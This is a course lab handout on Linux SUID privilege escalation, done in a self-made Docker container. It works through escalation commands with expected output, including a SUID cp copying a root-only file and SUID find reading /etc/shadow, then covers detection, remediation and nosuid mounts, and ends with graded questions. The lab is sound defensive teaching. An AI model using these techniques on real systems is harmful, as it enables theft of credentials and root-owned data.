---
title: "Lab 10 — Privilege Escalation via SUID Binaries"
course: SCIA-360
topic: Software Vulnerabilities & Privilege Escalation
chapter: 9
difficulty: "⭐⭐"
estimated_time: "60–75 minutes"
tags:
  - suid
  - privilege-escalation
  - gtfobins
  - linux-permissions
  - hardening
---

# Lab 10 — Privilege Escalation via SUID Binaries

| Field | Details |
|-------|---------|
| **Course** | SCIA-360 OS Security |
| **Topic** | Software Vulnerabilities & Privilege Escalation |
| **Chapter** | 9 |
| **Difficulty** | ⭐⭐ Intermediate |
| **Estimated Time** | 60–75 minutes |
| **Requires** | Docker, `ubuntu:22.04` image |

---

## Overview

Misconfigured **SUID (Set User ID) binaries** are consistently ranked among the top local privilege escalation vectors in penetration testing and CTF competitions. When a binary has the SUID bit set, it executes with the **file owner's privileges** (typically root) regardless of who runs it.

In this lab you will:

1. Discover existing SUID binaries on a default Ubuntu system
2. Understand why some SUID binaries are *legitimate* vs. *dangerous*
3. Exploit a deliberately misconfigured SUID binary to read root-owned files as an unprivileged user
4. Use the **GTFOBins** `find -exec` technique to read `/etc/shadow`
5. Detect unauthorized SUID binaries and remediate by removing the SUID bit
6. Understand the `nosuid` mount option as a defense-in-depth control

!!! warning "Educational Purpose Only"
    All exploitation in this lab targets **containers you create and control**. These techniques must never be used against systems you do not own or have explicit written authorization to test. Unauthorized privilege escalation is a criminal offense under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide.

---

## Background: How SUID Works

When the kernel executes a binary with the SUID bit set, it sets the **effective UID** of the process to the **owner** of the file — not the user who ran it. This is why `/usr/bin/passwd` can modify `/etc/shadow` (owned by root, mode `000`) even when run by an ordinary user: `passwd` is owned by root and has SUID set, so the process runs as root.

```
Normal execution:  real UID = 1000 (lowpriv), effective UID = 1000
SUID execution:    real UID = 1000 (lowpriv), effective UID = 0 (root)
```

The danger arises when a binary that **accepts arbitrary arguments or executes arbitrary commands** is given the SUID bit — because those arbitrary commands now run as root.

---

## Part 1 — Discovery

### Step 1.1 — Launch the lab container

Start an interactive Ubuntu container and create a low-privilege user. **All subsequent commands in Parts 1–4 run inside this container.**

```bash
docker run --rm -it ubuntu:22.04 bash
```

Once inside the container:

```bash
useradd -m -s /bin/bash lowpriv && echo 'lowpriv:password' | chpasswd
```

---

### Step 1.2 — Find all SUID binaries

The `find` command with `-perm -4000` locates every file with the SUID bit set anywhere on the filesystem:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Expected output (default Ubuntu 22.04):**
```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
```

These are **legitimate** SUID binaries — each one requires elevated privileges for a specific, narrow purpose. `passwd` needs to write to `/etc/shadow`; `mount` needs to manage kernel mount tables.

📸 **Screenshot checkpoint 10a:** Capture the full output of the `find` command showing all SUID binaries.

---

### Step 1.3 — Establish the access boundary

Create a sensitive file that only root should be able to read, then verify the `lowpriv` user cannot access it:

```bash
echo 'SECRET_DATA=root_password_hash_backup' > /root/secrets.txt
chmod 600 /root/secrets.txt

su lowpriv -s /bin/bash -c 'cat /root/secrets.txt' 2>&1
su lowpriv -s /bin/bash -c 'id'
```

**Expected output:**
```
cat: /root/secrets.txt: Permission denied
uid=1000(lowpriv) gid=1000(lowpriv) groups=1000(lowpriv)
```

This confirms the baseline: `lowpriv` has no access to root-owned files.

📸 **Screenshot checkpoint 10b:** Capture the "Permission denied" error and the `id` output confirming the unprivileged identity.

---

## Part 2 — Exploit SUID cp (Misconfigured Binary)

A common misconfiguration is giving a file-manipulation utility (like `cp`, `tar`, or `rsync`) the SUID bit — typically done by a developer trying to make a "backup tool" that can read any file. The result is a universal privilege escalation gadget.

### Step 2.1 — Create the vulnerability

```bash
cp /bin/cp /usr/local/bin/backup_tool
chmod u+s /usr/local/bin/backup_tool
ls -la /usr/local/bin/backup_tool
```

**Expected output:**
```
-rwsr-xr-x 1 root root 141824 Apr 18 10:00 /usr/local/bin/backup_tool
```

The `s` in the owner execute position (`rws`) indicates the SUID bit is set. The binary is owned by root.

📸 **Screenshot checkpoint 10c:** Capture the `ls -la` output showing `-rwsr-xr-x` permissions on `backup_tool`.

---

### Step 2.2 — Exploit as lowpriv

Now switch to the unprivileged user and exploit the misconfigured SUID binary:

```bash
su lowpriv -s /bin/bash -c '
echo "My identity: $(id)"
echo "Exploiting SUID backup_tool..."
/usr/local/bin/backup_tool /root/secrets.txt /tmp/stolen.txt
cat /tmp/stolen.txt
'
```

**Expected output:**
```
My identity: uid=1000(lowpriv) gid=1000(lowpriv) groups=1000(lowpriv)
Exploiting SUID backup_tool...
SECRET_DATA=root_password_hash_backup
```

**What happened:** `lowpriv` ran `backup_tool`, which executed with root's effective UID due to the SUID bit. As root, it could read `/root/secrets.txt` and copy it to `/tmp/stolen.txt`. The lowpriv user then read the copy — **successfully exfiltrating root-owned data without ever having root access themselves.**

📸 **Screenshot checkpoint 10d:** Capture the full output showing the unprivileged identity and the successfully read secret file contents.

---

## Part 3 — Exploit SUID find (GTFOBins)

[GTFOBins](https://gtfobins.github.io/) is a curated reference of Unix binaries that can be abused when given elevated privileges (SUID, sudo, capabilities). The `find` binary is particularly dangerous because its `-exec` flag can run **arbitrary commands** with the elevated privileges.

### Step 3.1 — Create the SUID find binary

```bash
cp /usr/bin/find /usr/local/bin/suid_find
chmod u+s /usr/local/bin/suid_find
ls -la /usr/local/bin/suid_find
```

---

### Step 3.2 — Read /etc/shadow via find -exec

```bash
su lowpriv -s /bin/bash -c '
echo "Reading /etc/shadow using SUID find -exec:"
/usr/local/bin/suid_find /etc/shadow -exec cat {} \; 2>/dev/null | head -3
'
```

**Expected output:**
```
Reading /etc/shadow using SUID find -exec:
root:*:19450:0:99999:7:::
daemon:*:19450:0:99999:7:::
bin:*:19450:0:99999:7:::
```

`/etc/shadow` is normally readable only by root (mode `640`, group `shadow`). The `lowpriv` user has no access — but `suid_find` runs as root, so `find /etc/shadow -exec cat {} \;` reads it as root and outputs it to `lowpriv`'s terminal.

!!! warning "Real-world impact"
    In a real attack, an attacker with access to the shadow file would immediately feed it to a password cracker (Hashcat, John the Ripper). Cracked passwords enable lateral movement to other systems where users reuse passwords.

📸 **Screenshot checkpoint 10e:** Capture the output showing `/etc/shadow` contents read via the SUID `find` binary.

---

## Part 4 — Detection and Remediation

### Step 4.1 — Audit for unauthorized SUID binaries

A standard operating procedure is to maintain a baseline of known-good SUID binaries and alert on any new additions. Two useful detection techniques:

```bash
# Check non-standard paths for SUID binaries
find /usr/local -perm -4000 -type f 2>/dev/null

# Find SUID binaries newer than a known-good reference binary
find / -perm -4000 -newer /bin/ls 2>/dev/null
```

Both commands should reveal the unauthorized `backup_tool` and `suid_find` you created.

📸 **Screenshot checkpoint 10f-audit:** Capture the output showing the unauthorized SUID binaries detected.

---

### Step 4.2 — Remove the SUID bits

```bash
chmod u-s /usr/local/bin/backup_tool
chmod u-s /usr/local/bin/suid_find

ls -la /usr/local/bin/backup_tool /usr/local/bin/suid_find

# Verify the exploit no longer works
su lowpriv -s /bin/bash -c '/usr/local/bin/backup_tool /root/secrets.txt /tmp/test2.txt 2>&1'
```

**Expected output:**
```
-rwxr-xr-x 1 root root ... backup_tool    ← 's' is gone
-rwxr-xr-x 1 root root ... suid_find
/usr/local/bin/backup_tool: cannot open '/root/secrets.txt' for reading: Permission denied
```

📸 **Screenshot checkpoint 10f:** Capture the permissions after removal and the "Permission denied" confirming the fix.

---

### Step 4.3 — Defense in depth: nosuid mount option

Beyond removing individual SUID bits, the `nosuid` mount option provides a **filesystem-level defense** that renders SUID bits inert on entire partitions:

```bash
echo '=== Defense: nosuid mount option ==='
echo 'Add to /etc/fstab: /dev/sdX /data ext4 defaults,nosuid,noexec 0 0'
echo 'nosuid: SUID bits on this filesystem are IGNORED'
echo 'noexec: Cannot execute binaries on this filesystem'
echo 'This is why /tmp should always be mounted nosuid,noexec'
```

**Key principle:** Even if an attacker drops a SUID binary into `/tmp` (a common staging area), the kernel will not honor the SUID bit if `/tmp` is mounted with `nosuid`. The binary runs with the caller's UID, not root.

---

## Cleanup

Exit the container (type `exit` or press `Ctrl+D`), then:

```bash
docker system prune -f
```

---

## Assessment

### Screenshot Checklist

| ID | Description | Points |
|----|-------------|--------|
| **10a** | SUID binary list from `find / -perm -4000` | 7 |
| **10b** | `lowpriv` denied access to `/root/secrets.txt` and `id` output | 7 |
| **10c** | `backup_tool` showing `-rwsr-xr-x` permissions | 7 |
| **10d** | `lowpriv` successfully reading root file via SUID `backup_tool` | 7 |
| **10e** | SUID `find` reading `/etc/shadow` as `lowpriv` | 6 |
| **10f** | SUID bits removed and access now blocked (Permission denied) | 6 |
| | **Screenshot subtotal** | **40** |

!!! tip "Grading Rubric"
    | Component | Points |
    |-----------|--------|
    | Screenshots (checklist above) | 40 |
    | SUID risk analysis table (complete all columns for 6 binaries) | 20 |
    | Reflection questions (4 × 10 pts each) | 40 |
    | **Total** | **100** |

---

### SUID Risk Analysis Table *(complete and submit)*

For each binary below, complete the table. Use GTFOBins (`https://gtfobins.github.io/`) as a reference.

| Binary | Legitimate Purpose for SUID | Exploitation Method if Misconfigured | Risk Level | Should Have SUID? |
|--------|----------------------------|--------------------------------------|------------|-------------------|
| `/usr/bin/passwd` | | | | |
| `/usr/bin/su` | | | | |
| `/usr/bin/mount` | | | | |
| `/usr/bin/find` | | | | |
| `/usr/bin/python3` | | | | |
| `/usr/bin/vim` | | | | |

---

### Reflection Questions

Answer each question in **150–200 words**.

1. **SUID mechanics:** Explain the SUID bit at the kernel level. When `lowpriv` runs `backup_tool`, what are the real UID, effective UID, and saved UID of the process? Why does `/usr/bin/passwd` *need* SUID to function correctly (explain the specific file it must write to and why), while a custom `backup_tool` should **never** have SUID?

2. **GTFOBins and command execution:** GTFOBins is a curated list of Unix binaries that can be exploited when misconfigured with SUID, sudo, or other elevated privileges. Why is `find -exec` particularly dangerous as a SUID binary compared to, say, SUID `ls`? What is the critical difference between a binary that *reads* data vs. one that can *execute arbitrary commands*? Name two other GTFOBins entries with similar arbitrary-execution risks.

3. **Automated detection:** You used `find / -perm -4000 -newer /bin/ls` to find recently created SUID binaries. Design a complete automated monitoring strategy for a production Linux server: What baseline would you establish at provisioning? How often would you scan? How would you alert on new SUID binaries? What SIEM rule would you write to detect this?

4. **nosuid at the kernel level:** The `nosuid` mount option on `/tmp` would have prevented the `backup_tool` exploit if `backup_tool` was placed in `/tmp`. Explain how `nosuid` is enforced at the kernel level during the `execve()` system call. Why should `/tmp`, `/home`, and any world-writable directory always be mounted with `nosuid,noexec`? What other mount options complement these for a defense-in-depth approach?
